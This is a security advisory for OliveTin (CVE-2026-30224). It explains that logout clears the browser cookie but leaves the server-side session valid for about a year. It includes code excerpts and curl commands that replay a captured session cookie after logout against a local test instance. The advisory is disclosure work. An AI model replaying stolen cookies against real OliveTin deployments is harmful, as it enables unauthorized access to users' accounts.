# [M] OliveTin Session Fixation: Logout Fails to Invalidate Server-Side Session

## Summary
Severity: Medium
Advisory: GHSA-gq2m-77hf-vwgh
CVE: CVE-2026-30224
CWE: CWE-384, CWE-613
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-gq2m-77hf-vwgh
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0 <0.0.0-20260304233115-d6a0abc3755d15

## Details
### Summary
OliveTin does not revoke server-side sessions when a user logs out. Although the browser cookie is cleared, the corresponding session remains valid in server storage until expiry (default ≈ 1 year).

An attacker with a previously stolen or captured session cookie can continue authenticating after logout, resulting in a post-logout authentication bypass.

This is a session management flaw that violates expected logout semantics.

### Details
During logout:
```
// Logout only clears browser cookie
response.Header().Set("Set-Cookie", localCookie.String())
```
However, the server still accepts the session:
```
session := sessionStorage.Providers[provider].Sessions[sid]
...
return session
```
The SID is not deleted from sessionStorage.

Why vulnerable: Logout does not remove the SID from sessionStorage; old cookie is still accepted until expiry (~1 year).

File: [api.go](app://-/index.html?hostId=local#), [sessions.go](app://-/index.html?hostId=local#), [local.go](app://-/index.html?hostId=local#)
Lines: api.go:392-427; sessions.go:39-59, 61-80; local.go:32-47
Behavior
- Login → receive SID cookie
- Logout → cookie cleared client-side
- Replay old SID manually → still authenticated

Expected:
- Logout invalidates session immediately

Actual:
- Old SID remains usable until expiry

### PoC

Minimal config
```
listenAddressSingleHTTPFrontend: 0.0.0.0:16642
authRequireGuestsToLogin: true

authLocalUsers:
  enabled: true
  users:
    - username: low
      usergroup: users
      password: "$argon2id$..."

actions:
  - title: Dummy
    id: dummy
    shell: "echo dummy"
```

### Reproduction

Login and capture SID:
```
LOGIN=$(curl -i -X POST http://localhost:16642/api/LocalUserLogin \
  -H 'Content-Type: application/json' \
  -d '{"username":"low","password":"lowpass"}')

SID=$(printf '%s\n' "$LOGIN" | awk -F'[=;]' '/olivetin-sid-local/{print $2}')
```
Works before logout:
```
curl -X POST http://localhost:16642/api/WhoAmI \
  -H "Cookie: olivetin-sid-local=$SID"
```
Logout:
```
curl -X POST http://localhost:16642/api/Logout \
  -H "Cookie: olivetin-sid-local=$SID"
```
Replay old cookie:
```
curl -X POST http://localhost:16642/api/WhoAmI \
  -H "Cookie: olivetin-sid-local=$SID"
```
Result

User is still authenticated after logout.
### Impact
Type:

Session Management Flaw

- Logout Bypass
- Session Replay

Risk:
- Stolen cookies remain valid
- Persistent unauthorized access
- Users falsely believe logout ended the session

Attack scenarios:
- Shared computers
- XSS/session theft
- Proxy logs
- Malware/browser compromise

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-gq2m-77hf-vwgh
- https://nvd.nist.gov/vuln/detail/CVE-2026-30224
- https://github.com/OliveTin/OliveTin/commit/d6a0abc3755d43107be1939567c52953bcbec3d5
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1
